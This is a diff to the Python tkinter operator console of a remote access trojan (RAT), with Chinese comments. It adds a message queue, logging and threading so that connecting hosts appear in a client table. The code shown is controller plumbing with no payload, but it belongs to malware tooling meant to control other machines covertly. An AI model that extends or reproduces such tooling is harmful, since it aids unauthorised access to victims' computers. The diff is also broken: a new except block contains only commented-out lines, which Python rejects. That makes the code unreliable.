@@ -7,8 +7,13 @@ import tkinter as tk
 from tkinter import ttk, Menu, Toplevel, messagebox, scrolledtext
 from server import RAT_SERVER
 import threading
+import queue
 from modules.generate_client_demo import generate_client
 from modules.terminal import Terminal
+import logging
+logging.basicConfig(level=logging.DEBUG,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
+
 class ratGUI:
     """
     RAT GUI
@@ -17,19 +22,38 @@ class ratGUI:
     def __init__(self, root, server : RAT_SERVER):
         self.root = root
         self.server = server
+        self.server.root = self.root
         self.server.on_client_connected = self.add_client_to_table
         self.server.on_client_disconnected = self.remove_client_from_table
         self.root.title("RAT")
+        self.current_client = None
         self.create_menu()
         self.create_toolbar()
         self.create_table()
         self.create_status_bar()
         self.create_log()
-        
+        self.msg_queue = queue.Queue()
+        self.run_gui()
 
-        #等待连接
+    
+    def run_gui(self):
+        '''
+        运行gui
+        '''
+        # 进入after的循环：从msg_queue中取出一个元素，插入到client列表中
+        self.handle_msg_queue()
+        # 等待连接
         self.start_connection_thread()
-        self.current_client = None
+        self.root.mainloop()
+        
+    def handle_msg_queue(self):
+        '''
+        处理msg_queue
+        '''
+        while not self.msg_queue.empty():
+            addr = self.msg_queue.get()
+            self.add_client_to_table(*addr)
+        self.root.after(1000, self.handle_msg_queue)
 
     def create_menu(self):
         '''
@@ -125,6 +149,8 @@ class ratGUI:
         # 切换当前客户端
         self.current_client = self.server.get_client(ip, port)
         
+    
+        
     def add_client_to_table(self, ip: str, addr: int):
         '''
         server回调函数，添加客户端到client列表
@@ -132,10 +158,14 @@ class ratGUI:
             ip: 客户端ip
             addr: 客户端地址(ip, port)
         '''
-        self.tree.insert("", tk.END, values=(ip, addr, "未知", "未知", "未知", "未知", "未知"))
-        self.client_num += 1
-        self.status_bar.config(text=f"有{self.client_num}个主机在线")
-        self.log_message(f"主机{ip}已连接")
+        try:
+            self.tree.insert("", tk.END, values=(ip, str(addr), "未知", "未知", "未知", "未知", "未知"))
+            self.client_num += 1
+            self.status_bar.config(text=f"有{self.client_num}个主机在线")
+            self.log_message(f"主机{ip}已连接")
+            # logging.debug(f"Successfully inserted client with IP: {ip}")
+        except Exception as e:
+            # logging.error(f"Error inserting into tree: {e}")
     
     
     def remove_client(self):
@@ -191,7 +221,7 @@ class ratGUI:
         '''
         开启server线程
         '''
-        connection_thread = threading.Thread(target=self.server.build_connection)
+        connection_thread = threading.Thread(target=self.server.build_connection, args=(self.msg_queue,))
         connection_thread.daemon = True
         connection_thread.start()
         self.log_message("等待客户端连接...")
@@ -246,7 +276,6 @@ class ratGUI:
 if __name__ == "__main__":
     rat = RAT_SERVER("127.0.0.1", 4444)
     root = tk.Tk()
-    app = ratGUI(root, rat)
     root.geometry("800x600")
-    root.mainloop()
+    app = ratGUI(root, rat)
     
